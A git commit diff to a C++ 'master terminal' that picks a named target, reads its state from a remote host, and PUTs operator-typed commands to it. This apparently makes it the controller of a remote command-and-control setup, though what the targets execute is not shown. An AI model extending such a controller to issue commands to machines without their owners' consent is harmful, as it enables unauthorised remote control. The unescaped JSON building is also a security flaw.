52b4d948234cf8a505398a9efd5150438568a866
James <jameslimbj@gmail.com>
2021-01-28 19:03:54 +0800

    :sparkles: FEAT: new master terminal for targetting

--- Wazzup/main_master.cpp
+++ Wazzup/main_master.cpp
@@ -12,21 +12,40 @@ int main() {
 
 	std::cout << "Welcome back.\n";
 
+	std::string target = "";
+
 	while (true) {
-		std::string target = "";
+		if (target == "") {
+			std::cout << "TARGET > ";
+			std::cin >> target;
+		}
+
+		const std::wstring statePath = Helpers::ToUTF16("/dms/" + target + "/state.json", CP_UTF8);
+		const REST::Response state = REST::SendRequest(HOST, statePath, L"GET");
+
 		std::string buffer = "";
 
-		std::cout << "> ";
-		std::cin >> target;
-		std::getline(std::cin, buffer);
+		std::cout << target << " > ";
+		std::cin >> buffer;
 
-		const std::wstring path = Helpers::ToUTF16("/dms/" + target + ".json", CP_UTF8);
-		buffer = "{ \"state\": \"DEAD\", \"cmd\": \"" + buffer + "\" }";
+		const std::string cmd = Helpers::Trim(buffer);
 
-		REST::Response response = REST::SendRequest(HOST, path, L"PUT", buffer);
+		if (cmd == "EXIT") {
+			break;
+		} else if (cmd == "SWITCH") {
+			target = "";
+			continue;
+		}
+
+		const std::wstring targetPath = Helpers::ToUTF16("/dms/" + target + ".json", CP_UTF8);
+		const std::string body = "{ \"state\": \"DEAD\", \"cmd\": \"" + cmd + "\" }";
+
+		const REST::Response response = REST::SendRequest(HOST, targetPath, L"PUT", body);
 
 		std::cout << response.body << '\n';
 	}
+
+	std::cout << "Until next time.\n";
 
 	return 0;
 }
